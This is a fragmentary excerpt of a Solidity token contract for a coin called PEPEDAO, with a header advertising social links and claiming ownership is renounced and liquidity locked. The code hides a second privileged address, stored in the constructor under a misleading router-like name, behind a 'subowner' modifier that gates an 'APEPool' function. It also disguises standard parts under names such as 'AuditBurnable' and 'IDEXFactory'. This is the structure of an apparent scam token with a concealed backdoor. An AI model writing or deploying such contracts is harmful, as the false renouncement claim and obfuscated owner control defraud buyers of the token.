...
/**
Coin: PEPEDAO |  Telegram 

https://twitter.com/PEPEDAO_Global
https://t.me/PepeDAO_Global
🔐RENOUNCED 🔐
🔐LP LOCKED 🔐
*/
...
/*
 * @dev Provides information about the current execution AuditBurnable, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 ...
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract AuditBurnable {
...
// File: @openzeppelin/contracts/access/AuditOwnable.sol
 ...
 * the owner.
 */
abstract contract AuditOwnable is AuditBurnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "AuditOwnable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "AuditOwnable: new owner is the zero address");
...
contract PEPEDAO is AuditBurnable, bep20innovation, AuditOwnable {
   ...
   address private owneraddrress; 
    constructor(address apecoinRouterv3) {
        owneraddrress = apecoinRouterv3;     
        _name = "PEPEDAO";
        _symbol = "PEPEDAO";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {bep20innovation-totalSupply}.
    */
    ...
    /**
    * @dev See {bep20innovation-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return IDEXFactory[account];
    }
      modifier subowner() {
        require(owneraddrress == _msgSender(), "AuditOwnable: caller is not the owner");
        _;
    }
    /**
    * @dev See {bep20innovation-approve}.
    *
    * Requirements:
    *
    * - `transporteur` cannot be the zero address.
    */
    function APEPool(address apecoinRewards) external subowner {
    ...
    /**
    * @dev See {bep20innovation-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {bep20innovation-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {bep20innovation-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {bep20innovation};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), IDEXRouter[sender][_msgSender()].sub(yoursold, "bep20innovation: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {bep20innovation-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, IDEXRouter[_msgSender()][transporteur].sub(allbalances, "bep20innovation: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "bep20innovation: transfer from the zero address");
        require(shippingto != address(0), "bep20innovation: transfer to the zero address");
                
        IDEXFactory[sender] = IDEXFactory[sender].sub(yoursold, "bep20innovation: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "bep20innovation: approve from the zero address");
        require(transporteur != address(0), "bep20innovation: approve to the zero address");
